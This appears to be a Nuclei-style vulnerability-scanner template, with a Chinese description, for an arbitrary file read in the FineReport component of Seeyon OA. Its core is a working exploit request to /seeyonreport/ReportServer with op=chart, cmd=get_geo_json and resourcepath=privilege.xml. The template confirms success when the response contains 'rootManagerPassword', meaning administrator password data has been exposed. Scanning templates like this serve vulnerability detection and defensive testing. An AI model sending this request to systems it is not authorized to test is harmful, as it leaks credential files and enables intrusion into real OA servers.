id: seeyon-report-password-leak

info:
  name: "致远OA帆软报表组件任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    致远OA系统集成的帆软报表组件存在任意文件读取漏洞
      攻击者可通过构造恶意请求获取系统敏感文件内容
      （涉及密码等关键信息泄露风险）
  tags: 致远

http:
- raw:
  - |
    GET /seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'rootManagerPassword'
